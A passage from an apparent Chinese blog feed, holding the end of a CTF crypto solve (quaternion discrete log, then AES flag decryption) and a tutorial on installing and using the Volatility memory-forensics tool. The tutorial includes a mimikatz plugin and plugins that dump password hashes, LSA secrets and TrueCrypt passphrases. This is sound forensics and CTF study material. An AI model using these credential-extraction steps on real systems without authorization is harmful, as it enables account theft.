class="hljs-keyword">return</span> (<span class="hljs-variable language_">self</span>.a * <span class="hljs-variable language_">self</span>.a + <span class="hljs-variable language_">self</span>.b * <span class="hljs-variable language_">self</span>.b + <span class="hljs-variable language_">self</span>.c * <span class="hljs-variable language_">self</span>.c + <span class="hljs-variable language_">self</span>.d * <span class="hljs-variable language_">self</span>.d) % <span class="hljs-variable language_">self</span>.p<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tup</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">self</span>.a, <span class="hljs-variable language_">self</span>.b, <span class="hljs-variable language_">self</span>.c, <span class="hljs-variable language_">self</span>.d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">power</span>(<span class="hljs-params">base_quat, exp</span>):<br>    res = Quaternion(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    base = base_quat<br>    <span class="hljs-keyword">while</span> exp:<br>        <span class="hljs-keyword">if</span> exp&amp;<span class="hljs-number">1</span>: res = res * base<br>        base = base * base<br>        exp &gt;&gt;= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q_pow</span>(<span class="hljs-params">q, exp</span>):<br>    r = Quaternion(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">while</span> exp:<br>        <span class="hljs-keyword">if</span> exp &amp; <span class="hljs-number">1</span>:<br>            r = r * q<br>        q = q * q<br>        exp &gt;&gt;= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> r<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q_inv</span>(<span class="hljs-params">q</span>):<br>    n = q.norm()<br>    n_inv = <span class="hljs-built_in">pow</span>(n, p-<span class="hljs-number">2</span>, p)<br>    conj_q = q.conj()<br>    <span class="hljs-keyword">return</span> Quaternion(conj_q.a * n_inv % p, conj_q.b * n_inv % p, conj_q.c * n_inv % p, conj_q.d * n_inv % p)<br><br>Q = Quaternion(*Q_components)<br>R = Quaternion(*R_components)<br><br><span class="hljs-comment"># ---BSGS---</span><br>m = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span><br>baby = &#123;&#125;<br>cur = Quaternion(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    baby[cur.tup()] = j<br>    cur = cur * Q<br>Q_m_inv = q_pow(q_inv(Q), m)<br><br>found = <span class="hljs-literal">None</span><br>gamma = R<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    <span class="hljs-keyword">if</span> gamma.tup() <span class="hljs-keyword">in</span> baby:<br>        j = baby[gamma.tup()]<br>        found = i * m + j<br>        <span class="hljs-keyword">break</span><br>    gamma = gamma * Q_m_inv<br>secret = found<br><span class="hljs-keyword">assert</span> power(Q,secret).tup() == R.tup()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">--- Public Parameters ---</span><br><span class="hljs-string">p = 115792089237316195423570985008687907853269984665640564039457584007913129639747</span><br><span class="hljs-string">Q = Q(123456789, 987654321, 135792468, 864297531)</span><br><span class="hljs-string">R = Q(53580504271939954579696282638160058429308301927753139543147605882574336327145, 79991318245209837622945719467562796951137605212294979976479199793453962090891, 53126869889181040587037210462276116096032594677560145306269148156034757160128, 97368024230306399859522783292246509699830254294649668434604971213496467857155)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>ct = <span class="hljs-string">b&#x27;(\xe4IJ\xfd4%\xcf\xad\xb4\x7fi\xae\xdbZux6-\xf4\xd72\x14BB\x1e\xdc\xb7\xb7\xd1\xad#e@\x17\x1f\x12\xc4\xe5\xa6\x10\x91\x08\xd6\x87\x82H\x9e&#x27;</span><br>key = md5(<span class="hljs-built_in">str</span>(secret).encode()).hexdigest().encode()<br>flag = unpad(AES.new(key, AES.MODE_ECB).decrypt(ct), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(secret, flag.decode())<br><br><span class="hljs-comment"># b&#x27;(\xe4IJ\xfd4%\xcf\xad\xb4\x7fi\xae\xdbZux6-\xf4\xd72\x14BB\x1e\xdc\xb7\xb7\xd1\xad#e@\x17\x1f\x12\xc4\xe5\xa6\x10\x91\x08\xd6\x87\x82H\x9e&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内存取证工具volatility及使用</title>
    <link href="/2025/09/05/ctf/note/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7volatility%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <url>/2025/09/05/ctf/note/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7volatility%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>&#x2F;<em>based on kali2020 vmware</em>&#x2F;</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装依赖环境"><a href="#安装依赖环境" class="headerlink" title="安装依赖环境"></a>安装依赖环境</h2><h3 id="distorm3"><a href="#distorm3" class="headerlink" title="distorm3"></a>distorm3</h3><p><a href="https://github.com/vext01/distorm3">vext01&#x2F;distorm3：distorm3 — vext01&#x2F;distorm3: distorm3</a><br>下载zip解压 拖进虚拟机桌面 移动root下<br><code>cd dirstorm3</code><br><code>python2 setup.py install</code><br>可选插件  </p><blockquote><p><strong>Distorm3（反编译库）：pip install distorm3<br>Yara（恶意软件分类工具）：pip install yara<br>PyCrypto（加密工具集）：pip install pycrypto<br>PIL（图片处理库）：pip install pil<br>OpenPyxl（读写excel文件）：pip install openpyxl<br>ujson（JSON解析）：pip install ujson</strong></p></blockquote><h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="安装pip2"><a href="#安装pip2" class="headerlink" title="安装pip2"></a>安装pip2</h4><p><code>下载 get-pip.py</code><br><code>curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py</code><br><code>安装 pip</code><br><code>python2 get-pip.py</code></p><h4 id="安装pycrptodome"><a href="#安装pycrptodome" class="headerlink" title="安装pycrptodome"></a>安装pycrptodome</h4><p>输入<br><code>pip2 install pycryptodome</code><br>如果安装失败，可使用以下命令切换国内源<br><code>pip2 install pycryptodome -i https://pypi.tuna.tsinghua.edu.cn/simple</code></p><h2 id="下载volatility源码"><a href="#下载volatility源码" class="headerlink" title="下载volatility源码"></a>下载volatility源码</h2><p><a href="https://github.com/volatilityfoundation/volatility">https://github.com/volatilityfoundation/volatility</a><br>下载zip解压后将volatility-master拖进虚拟机桌面 然后移动到root下<br><code>cd volatility-master</code><br><code>python2 setup.py install</code><br><code>vol.py</code><br>出现一堆Failed to import不要慌 第一行有版本信息就行<br>把当前目录rename为volatility然后移动到指定的文件夹<br><code>sudo mv volatility /usr/local/</code><br><code>sudo vim /etc/profile</code><br>在最后一行添加<br>    <code>export PATH=/usr/local/volatility:$PATH</code><br>输入<code>:wq!</code>保存并退出</p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><h3 id="安装mimikatz"><a href="#安装mimikatz" class="headerlink" title="安装mimikatz"></a>安装mimikatz</h3><p><a href="https://cloud.tencent.com/developer/article/2160360">Volatility安装mimikatz-腾讯云开发者社区-腾讯云</a><br>将mimikatz.py复制到volatility下的plugins文件夹<br><code>sudo mv mimikatz.py /usr/local/volatility/plugins/</code><br><code>pip install construct</code></p><p>此时运行<code>vol.py --info</code>发现基本没有插件报错了</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><a href="https://www.cnblogs.com/sakura--tears/p/17148293.html#%E4%BA%94%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F">内存取证-volatility工具的使用 （史上更全教程，更全命令） - 路baby - 博客园</a></p><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p><code>vol.py -h</code>查看帮助</p><blockquote><p>Volatility Foundation Volatility Framework 2.6<br>用法： Volatility - 内存取证分析平台</p><p>Options:<br>  -h, –help            列出所有可用选项及其默认值<br>                        默认值可以在配置文件中设置<br>                        (&#x2F;etc&#x2F;volatilityrc)<br>  –conf-file&#x3D;&#x2F;home&#x2F;kali&#x2F;.volatilityrc<br>                        基于用户的配置文件<br>  -d, –debug           调试Volatility<br>  –plugins&#x3D;PLUGINS     要使用的其他插件目录（冒号分隔）<br>  –info                打印所有注册对象的信息<br>  –cache-directory&#x3D;&#x2F;home&#x2F;kali&#x2F;.cache&#x2F;volatility<br>                        存放缓存文件的目录<br>  –cache               使用缓存<br>  –tz&#x3D;TZ               设置 (Olson) 时区以使用 pytz（如果已安装）或 tzset 显示时间戳<br>  -f FILENAME, –filename&#x3D;FILENAME<br>                        打开图像时使用的文件名<br>  –profile&#x3D;WinXPSP2x86<br>                        要加载的配置文件的名称（使用 –info 查看支持的配置文件列表）<br>  -l LOCATION, –location&#x3D;LOCATION<br>                        从中加载地址空间的 URN 位置<br>  -w, –write           启用写支持<br>  –dtb&#x3D;DTB             DTB 地址<br>  –shift&#x3D;SHIFT         Mac KASLR 移位地址<br>  –output&#x3D;text         以这种格式输出（支持特定于模块，请参阅下面的模块输出选项）<br>  –output-file&#x3D;OUTPUT_FILE<br>                        在此文件中写入输出<br>  -v, –verbose         详细信息<br>  -g KDBG, –kdbg&#x3D;KDBG  指定一个 KDBG 虚拟地址（注意：对于 64 位 Windows 8 及更高版本，这是 KdCopyDataBlock 的地址）<br>  –force               强制使用可疑配置文件<br>  -k KPCR, –kpcr&#x3D;KPCR  指定特定的 KPCR 地址<br>  –cookie&#x3D;COOKIE       指定 nt!ObHeaderCookie 的地址（仅适用于 Windows 10）</p><pre><code class="hljs">支持的插件命令:amcache        查看AmCache应用程序痕迹信息apihooks       检测内核及进程的内存空间中的API hookatoms          列出会话及窗口站atom表atomscan       Atom表的池扫描(Pool scanner)auditpol       列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息bigpools       使用BigPagePoolScanner转储大分页池(big page pools)bioskbd        从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)cachedump      获取内存中缓存的域帐号的密码哈希callbacks      打印全系统通知例程clipboard      提取Windows剪贴板中的内容cmdline        显示进程命令行参数cmdscan        提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）connections    打印系统打开的网络连接(仅支持Windows XP 和2003)connscan       打印TCP连接信息consoles       提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）crashinfo      提取崩溃转储信息deskscan       tagDESKTOP池扫描(Poolscaner)devicetree     显示设备树信息dlldump        从进程地址空间转储动态链接库dlllist        打印每个进程加载的动态链接库列表driverirp      IRP hook驱动检测drivermodule   关联驱动对象至内核模块driverscan     驱动对象池扫描dumpcerts      提取RAS私钥及SSL公钥dumpfiles      提取内存中映射或缓存的文件dumpregistry   转储内存中注册表信息至磁盘editbox        查看Edit编辑控件信息 (Listbox正在实验中)envars         显示进程的环境变量eventhooks     打印Windows事件hook详细信息evtlogs        提取Windows事件日志（仅支持XP/2003)filescan       提取文件对象（file objects）池信息gahti          转储用户句柄（handle）类型信息gditimers      打印已安装的GDI计时器(timers)及回调(callbacks)gdt            显示全局描述符表(Global Deor Table)getservicesids 获取注册表中的服务名称并返回SID信息getsids        打印每个进程的SID信息handles        打印每个进程打开的句柄的列表hashdump       转储内存中的Windows帐户密码哈希(LM/NTLM)hibinfo        转储休眠文件信息hivedump       打印注册表配置单元信息hivelist       打印注册表配置单元列表hivescan       注册表配置单元池扫描hpakextract    从HPAK文件（Fast Dump格式）提取物理内存数据hpakinfo       查看HPAK文件属性及相关信息idt            显示中断描述符表(Interrupt Deor Table)iehistory      重建IE缓存及访问历史记录imagecopy      将物理地址空间导出原生DD镜像文件imageinfo      查看/识别镜像信息impscan        扫描对导入函数的调用joblinks       打印进程任务链接信息kdbgscan       搜索和转储潜在KDBG值kpcrscan       搜索和转储潜在KPCR值ldrmodules     检测未链接的动态链接DLLlsadump        从注册表中提取LSA密钥信息（已解密）machoinfo      转储Mach-O 文件格式信息malfind        查找隐藏的和插入的代码mbrparser      扫描并解析潜在的主引导记录(MBR)memdump        转储进程的可寻址内存memmap         打印内存映射messagehooks   桌面和窗口消息钩子的线程列表mftparser      扫描并解析潜在的MFT条目moddump        转储内核驱动程序到可执行文件的示例modscan        内核模块池扫描modules        打印加载模块的列表multiscan      批量扫描各种对象mutantscan     对互斥对象池扫描notepad        查看记事本当前显示的文本objtypescan    扫描窗口对象类型对象patcher        基于页面扫描的补丁程序内存poolpeek       可配置的池扫描器插件printkey       打印注册表项及其子项和值privs          显示进程权限procdump       进程转储到一个可执行文件示例pslist         按照EPROCESS列表打印所有正在运行的进程psscan         进程对象池扫描pstree         以树型方式打印进程列表psxview        查找带有隐藏进程的所有进程列表qemuinfo       转储 Qemu 信息raw2dmp        将物理内存原生数据转换为windbg崩溃转储格式screenshot     基于GDI Windows的虚拟屏幕截图保存servicediff    Windows服务列表(ala Plugx)sessions       _MM_SESSION_SPACE的详细信息列表(用户登录会话)shellbags      打印Shellbags信息shimcache      解析应用程序兼容性Shim缓存注册表项shutdowntime   从内存中的注册表信息获取机器关机时间sockets        打印已打开套接字列表sockscan       TCP套接字对象池扫描ssdt           显示SSDT条目strings        物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)svcscan        Windows服务列表扫描symlinkscan    符号链接对象池扫描thrdscan       线程对象池扫描threads        调查_ETHREAD 和_KTHREADstimeliner      创建内存中的各种痕迹信息的时间线timers         打印内核计时器及关联模块的DPCtruecryptmasterRecover 恢复TrueCrypt 7.1a主密钥truecryptpassphrase查找并提取TrueCrypt密码truecryptsummaryTrueCrypt摘要信息unloadedmodules打印卸载的模块信息列表userassist     打印注册表中UserAssist相关信息userhandles    转储用户句柄表vaddump        转储VAD数据为文件vadinfo        转储VAD信息vadtree        以树形方式显示VAD树信息vadwalk        显示遍历VAD树vboxinfo       转储Virtualbox信息（虚拟机）verinfo        打印PE镜像中的版本信息vmwareinfo     转储VMware VMSS/VMSN 信息volshell       内存镜像中的shellwindows        打印桌面窗口(详细信息)wintree        Z顺序打印桌面窗口树wndscan        池扫描窗口站yarascan       以Yara签名扫描进程或内核内存</code></pre></blockquote><p>vol.py –info查看插件</p><blockquote><p>Volatility Foundation Volatility Framework 2.6</p><h2 id="Profiles"><a href="#Profiles" class="headerlink" title="Profiles"></a>Profiles</h2><p>VistaSP0x64           - Windows Vista SP0 x64 的配置文件<br>VistaSP0x86           - Windows Vista SP0 x86 的配置文件<br>VistaSP1x64           - Windows Vista SP1 x64 的配置文件<br>VistaSP1x86           - Windows Vista SP1 x86 的配置文件<br>VistaSP2x64           - Windows Vista SP1 x86 的配置文件<br>VistaSP2x86           - Windows Vista SP2 x64 的配置文件<br>Win10x64              - Windows 10 x64 的配置文件<br>Win10x64_10586        - Windows 10 x64 的配置文件 (10.0.10586.306 &#x2F; 2016-04-23)<br>Win10x64_14393        - Windows 10 x64 的配置文件 (10.0.14393.0 &#x2F; 2016-07-16)<br>Win10x86              - Windows 10 x86 的配置文件<br>Win10x86_10586        - Windows 10 x86 的配置文件 (10.0.10586.420 &#x2F; 2016-05-28)<br>Win10x86_14393        - Windows 10 x86 的配置文件 (10.0.14393.0 &#x2F; 2016-07-16)<br>Win2003SP0x86         - Windows 2003 SP0 x86 的配置文件<br>Win2003SP1x64         - Windows 2003 SP0 x86 的配置文件<br>Win2003SP1x86         - Windows 2003 SP1 x86 的配置文件<br>Win2003SP2x64         - Windows 2003 SP1 x86 的配置文件<br>Win2003SP2x86         - Windows 2003 SP2 x86 的配置文件<br>Win2008R2SP0x64       - Windows 2008 R2 SP0 x64 的配置文件<br>Win2008R2SP1x64       - Windows 2008 R2 SP1 x64 的配置文件<br>Win2008R2SP1x64_23418 - Windows 2008 R2 SP1 x64 的配置文件 (6.1.7601.23418 &#x2F; 2016-04-09)<br>Win2008SP1x64         - Windows 2008 SP1 x64 的配置文件<br>Win2008SP1x86         - Windows 2008 SP1 x86 的配置文件<br>Win2008SP2x64         - Windows 2008 SP2 x64 的配置文件<br>Win2008SP2x86         - Windows 2008 SP2 x86 的配置文件<br>Win2012R2x64          - Windows Server 2012 R2 x64 的配置文件<br>Win2012R2x64_18340    - Windows Server 2012 R2 x64 的配置文件 (6.3.9600.18340 &#x2F; 2016-05-13)<br>Win2012x64            - Windows Server 2012 x64 的配置文件<br>Win2016x64_14393      - Windows Server 2016 x64 的配置文件 (10.0.14393.0 &#x2F; 2016-07-16)<br>Win7SP0x64            - Windows 7 SP0 x64 的配置文件<br>Win7SP0x86            - Windows 7 SP0 x86 的配置文件<br>Win7SP1x64            - Windows 7 SP1 x64 的配置文件<br>Win7SP1x64_23418      - Windows 7 SP1 x64 的配置文件 (6.1.7601.23418 &#x2F; 2016-04-09)<br>Win7SP1x86            - Windows 7 SP1 x86 的配置文件<br>Win7SP1x86_23418      - Windows 7 SP1 x86 的配置文件 (6.1.7601.23418 &#x2F; 2016-04-09)<br>Win81U1x64            - Windows 8.1 更新 1 x64 的配置文件<br>Win81U1x86            - Windows 8.1 更新 1 x86 的配置文件<br>Win8SP0x64            - Windows 8 x64 的配置文件<br>Win8SP0x86            - Windows 8 x86 的配置文件<br>Win8SP1x64            - Windows 8.1 x64 的配置文件<br>Win8SP1x64_18340      - Windows 8.1 x64 的配置文件 (6.3.9600.18340 &#x2F; 2016-05-13)<br>Win8SP1x86            - Windows 8.1 x86 的配置文件<br>WinXPSP1x64           - Windows XP SP1 x64 的配置文件<br>WinXPSP2x64           - Windows XP SP2 x64 的配置文件<br>WinXPSP2x86           - Windows XP SP2 x86 的配置文件<br>WinXPSP3x86           - Windows XP SP3 x86 的配置文件</p><h2 id="Address-Spaces"><a href="#Address-Spaces" class="headerlink" title="Address Spaces"></a>Address Spaces</h2><p>AMD64PagedMemory              - 标准 AMD 64 位地址空间<br>ArmAddressSpace               - ARM 处理器的地址空间<br>FileAddressSpace              - 这是一个直接文件 AS.<br>HPAKAddressSpace              - 此 AS 支持 HPAK 格式<br>IA32PagedMemory               - 标准 IA-32 分页地址空间<br>IA32PagedMemoryPae            - 此类实现 IA-32 PAE 分页地址空间<br>LimeAddressSpace              - Lime 的地址空间<br>LinuxAMD64PagedMemory         - Linux 特定的 AMD 64 位地址空间<br>MachOAddressSpace             - mach-o 文件的地址空间以支持 atc-ny 内存读取器<br>OSXPmemELF                    - 这个 AS 支持 VirtualBox ELF64 coredump 格式<br>QemuCoreDumpElf               - 这个 AS 支持 Qemu ELF32 和 ELF64 核心转储格式<br>VMWareAddressSpace            - 此 AS 支持 VMware 快照 (VMSS) 和保存状态 (VMSS) 文件<br>VMWareMetaAddressSpace        - 此 AS 支持带有 VMSN&#x2F;VMSS 元数据的 VMEM 格式<br>VirtualBoxCoreDumpElf64       - 这个 AS 支持 VirtualBox ELF64 coredump 格式<br>Win10AMD64PagedMemory         - Windows 10 特定的 AMD 64 位地址空间<br>WindowsAMD64PagedMemory       - Windows 特定的 AMD 64 位地址空间<br>WindowsCrashDumpSpace32       - 这个 AS 支持 windows 崩溃转储格式<br>WindowsCrashDumpSpace64       - 此 AS 支持 windows Crash Dump 格式<br>WindowsCrashDumpSpace64BitMap - 此 AS 支持 Windows BitMap Crash Dump 格式<br>WindowsHiberFileSpace32       - 这是 Windows 休眠文件的休眠地址空间</p><h2 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h2><p>amcache                    - 打印 AmCache 信息<br>apihooks                   - 检测进程和内核内存中的 API 挂钩<br>atoms                      - 打印会话和窗口站原子表<br>atomscan                   - 原子表的池扫描器<br>auditpol                   - 从 HKLM\SECURITY\Policy\PolAdtEv 打印出审计策略<br>bigpools                   - 使用 BigPagePoolScanner 转储大页面池<br>bioskbd                    - 从实模式内存中读取键盘缓冲区<br>cachedump                  - 从内存中转储缓存的域哈希<br>callbacks                  - 打印系统范围的通知例程<br>clipboard                  - 提取 Windows 剪贴板的内容<br>cmdline                    - 显示进程命令行参数<br>cmdscan                    - 通过扫描 _COMMAND_HISTORY 来提取命令历史记录<br>connections                - 打印打开的连接列表 [仅限 Windows XP 和 2003]<br>connscan                   - 用于 tcp 连接的池扫描器<br>consoles                   - 通过扫描 _CONSOLE_INFORMATION 提取命令历史记录<br>crashinfo                  - 转储崩溃转储信息<br>deskscan                   - tagDESKTOP（台式机）的 Poolscaner<br>devicetree                 - 显示设备树<br>dlldump                    - 从进程地址空间转储 DLL<br>dlllist                    - 打印每个进程加载的 dll 列表<br>driverirp                  - 驱动程序 IRP 挂钩检测<br>drivermodule               - 将驱动程序对象关联到内核模块<br>driverscan                 - 驱动程序对象的池扫描器<br>dumpcerts                  - 转储 RSA 私有和公共 SSL 密钥<br>dumpfiles                  - 提取内存映射和缓存文件<br>dumpregistry               - 将注册表文件转储到磁盘<br>editbox                    - 显示有关编辑控件的信息（列表框实验）<br>envars                     - 显示进程环境变量<br>eventhooks                 - 在 Windows 事件挂钩上打印详细信息<br>evtlogs                    - 提取 Windows 事件日志（仅限 XP&#x2F;2003）<br>filescan                   - 文件对象的池扫描器<br>gahti                      - 转储 USER 句柄类型信息<br>gditimers                  - 打印已安装的 GDI 计时器和回调<br>gdt                        - 显示全局描述符表<br>getservicesids             - 获取 Registry 中的服务名称并返回计算的 SID<br>getsids                    - 打印拥有每个进程的 SID<br>handles                    - 打印每个进程的打开句柄列表<br>hashdump                   - 从内存中转储密码哈希 (LM&#x2F;NTLM)<br>hibinfo                    - 转储休眠文件信息<br>hivedump                   - 打印注册表<br>hivelist                   - 打印注册表配置单元列表<br>hivescan                   - 注册表配置单元的池扫描程序<br>hpakextract                - 从 HPAK 文件中提取物理内存<br>hpakinfo                   - 有关 HPAK 文件的信息<br>idt                        - 显示中断描述符表<br>iehistory                  - 重建 Internet Explorer 缓存&#x2F;历史<br>imagecopy                  - 将物理地址空间复制为原始 DD 映像<br>imageinfo                  - 识别图像的信息<br>impscan                    - 扫描对导入函数的调用<br>joblinks                   - 打印进程作业链接信息<br>kdbgscan                   - 搜索和转储潜在的 KDBG 值<br>kpcrscan                   - 搜索和转储潜在的 KPCR 值<br>ldrmodules                 - 检测未链接的 DLL<br>limeinfo                   - 转储 Lime 文件格式信息<br>linux_apihooks             - 检查用户态 apihooks<br>linux_arp                  - 打印 ARP 表<br>linux_aslr_shift           - 自动检测 Linux ASLR shift<br>linux_banner               - 打印 Linux 横幅信息<br>linux_bash                 - 从 bash 进程内存中恢复 bash 历史记录<br>linux_bash_env             - 恢复进程的动态环境变量<br>linux_bash_hash            - 从 bash 进程内存中恢复 bash 哈希表<br>linux_check_afinfo         - 验证网络协议的操作函数指针<br>linux_check_creds          - 检查是否有进程共享凭证结构<br>linux_check_evt_arm        - 检查异常向量表以查找系统调用表挂钩<br>linux_check_fop            - 检查 rootkit 修改的文件操作结构<br>linux_check_idt            - 检查 IDT 是否已被更改<br>linux_check_inline_kernel  - 检查内联内核挂钩<br>linux_check_modules        - 将模块列表与 sysfs 信息进行比较（如果可用）<br>linux_check_syscall        - 检查系统调用表是否已更改<br>linux_check_syscall_arm    - 检查系统调用表是否已更改<br>linux_check_tty            - 检查 tty 设备的钩子<br>linux_cpuinfo              - 打印每个活动处理器的信息<br>linux_dentry_cache         - 从 dentry 缓存中收集文件<br>linux_dmesg                - 收集 dmesg 缓冲区<br>linux_dump_map             - 将选定的内存映射写入磁盘<br>linux_dynamic_env          - 恢复进程的动态环境变量<br>linux_elfs                 - 在进程映射中查找 ELF 二进制文件<br>linux_enumerate_files      - 列出文件系统缓存引用的文件<br>linux_find_file            - 列出并从内存中恢复文件<br>linux_getcwd               - 列出每个进程的当前工作目录<br>linux_hidden_modules       - 雕刻内存以查找隐藏的内核模块<br>linux_ifconfig             - 收集活动接口<br>linux_info_regs            - 就像 GDB 中的“信息寄存器”。 它打印出所有<br>linux_iomem                - 提供类似于 &#x2F;proc&#x2F;iomem 的输出<br>linux_kernel_opened_files  - 列出从内核中打开的文件<br>linux_keyboard_notifiers   - 解析键盘通知器调用链<br>linux_ldrmodules           - 将 proc 映射的输出与 libdl 中的库列表进行比较<br>linux_library_list         - 列出加载到进程中的库<br>linux_librarydump          - 将进程内存中的共享库转储到磁盘<br>linux_list_raw             - 列出具有混杂套接字的应用程序<br>linux_lsmod                - 收集加载的内核模块<br>linux_lsof                 - 列出文件描述符及其路径<br>linux_malfind              - 寻找可疑的进程映射<br>linux_memmap               - 转储 linux 任务的内存映射<br>linux_moddump              - 提取加载的内核模块<br>linux_mount                - 收集挂载的 fs&#x2F;devices<br>linux_mount_cache          - 从 kmem_cache收集挂载的 fs&#x2F;devices<br>linux_netfilter            - 列出 Netfilter 钩子<br>linux_netscan              - 雕刻网络连接结构<br>linux_netstat              - 列出打开的套接字<br>linux_pidhashtable         - 通过 PID 哈希表枚举进程<br>linux_pkt_queues           - 将每个进程的数据包队列写入磁盘<br>linux_plthook              - 扫描 ELF 二进制文件的 PLT 以获取非需要图像的挂钩<br>linux_proc_maps            - 收集进程内存映射<br>linux_proc_maps_rb         - 通过映射红黑树为 linux 收集进程映射<br>linux_procdump             - 将进程的可执行映像转储到磁盘<br>linux_process_hollow       - 检查进程空心的迹象<br>linux_psaux                - 收集进程以及完整的命令行和开始时间<br>linux_psenv                - 收集进程及其静态环境变量<br>linux_pslist               - 通过遍历 task_struct-&gt;task 列表来收集活动任务<br>linux_pslist_cache         - 从 kmem_cache 收集任务<br>linux_psscan               - 扫描进程的物理内存<br>linux_pstree               - 显示进程之间的父&#x2F;子关系<br>linux_psxview              - 使用各种进程列表查找隐藏进程<br>linux_recover_filesystem   - 从内存中恢复整个缓存文件系统<br>linux_route_cache          - 从内存中恢复路由缓存<br>linux_sk_buff_cache        - 从 sk_buff kmem_cache 中恢复数据包<br>linux_slabinfo             - 在运行的机器上模拟 &#x2F;proc&#x2F;slabinfo<br>linux_strings              - 将物理偏移量与虚拟地址匹配（可能需要一段时间，非常冗长）<br>linux_threads              - 打印进程的线程<br>linux_tmpfs                - 从内存中恢复 tmpfs 文件系统<br>linux_truecrypt_passphrase - 恢复缓存的 Truecrypt 密码<br>linux_vma_cache            - 从 vm_area_struct 缓存中收集 VMA<br>linux_volshell             - 内存映像中的 Shell<br>linux_yarascan             - Linux 内存映像中的 shell<br>lsadump                    - 从注册表中转储（解密的）LSA 机密<br>mac_adium                  - 列出 Adium 消息<br>mac_apihooks               - 检查进程中的 API 挂钩<br>mac_apihooks_kernel        - 检查系统调用和内核函数是否被挂钩<br>mac_arp                    - 打印 arp 表<br>mac_bash                   - 从 bash 进程内存中恢复 bash 历史记录<br>mac_bash_env               - 恢复 bash 的环境变量<br>mac_bash_hash              - 从 bash 进程内存中恢复 bash 哈希表<br>mac_calendar               - 从 Calendar.app 获取日历事件<br>mac_check_fop              - 验证文件操作指针<br>mac_check_mig_table        - 列出内核 MIG 表中的整体<br>mac_check_syscall_shadow   - 查找影子系统调用表<br>mac_check_syscalls         - 检查系统调用表条目是否被挂钩<br>mac_check_sysctl           - 检查未知的 sysctl 处理程序<br>mac_check_trap_table       - 检查 mach 陷阱表条目是否被钩住<br>mac_compressed_swap        - 打印 Mac OS X VM 压缩器统计数据并转储所有压缩页面<br>mac_contacts               - 从 Contacts.app 获取联系人姓名<br>mac_dead_procs             - 打印终止&#x2F;取消分配的进程<br>mac_dead_sockets           - 打印终止&#x2F;取消分配的网络套接字<br>mac_dead_vnodes            - 列出释放的 vnode 结构<br>mac_devfs                  - 列出文件缓存中的文件<br>mac_dmesg                  - 打印内核调试缓冲区<br>mac_dump_file              - 转储指定文件<br>mac_dump_maps              - 转储进程的内存范围，可选地包括压缩交换中的页面<br>mac_dyld_maps              - 从 dyld 数据结构中获取进程的内存映射<br>mac_find_aslr_shift        - 查找 10.8+ 图像的 ASLR 移位值<br>mac_get_profile            - 自动检测 Mac 配置文件<br>mac_ifconfig               - 列出所有设备的网络接口信息<br>mac_interest_handlers      - 列出 IOKit 兴趣处理程序<br>mac_ip_filters             - 报告任何挂钩的 IP 过滤器<br>mac_kernel_classes         - 列出内核中加载的 c++ 类<br>mac_kevents                - 显示进程的父&#x2F;子关系<br>mac_keychaindump           - 恢复可能的钥匙串密钥。 使用chainbreaker打开相关的keychain文件<br>mac_ldrmodules             - 将 proc 映射的输出与 libdl 中的库列表进行比较<br>mac_librarydump            - 转储进程的可执行文件<br>mac_list_files             - 列出文件缓存中的文件<br>mac_list_kauth_listeners   - 列出 Kauth Scope 监听器<br>mac_list_kauth_scopes      - 列出 Kauth 范围及其状态<br>mac_list_raw               - 列出具有混杂套接字的应用程序<br>mac_list_sessions          - 枚举会话<br>mac_list_zones             - 打印活动区域<br>mac_lsmod                  - 列出加载的内核模块<br>mac_lsmod_iokit            - 列出通过 IOkit 加载的内核模块<br>mac_lsmod_kext_map         - 列出加载的内核模块<br>mac_lsof                   - 列出每个进程打开的文件<br>mac_machine_info           - 打印有关样本的机器信息<br>mac_malfind                - 寻找可疑的进程映射<br>mac_memdump                - 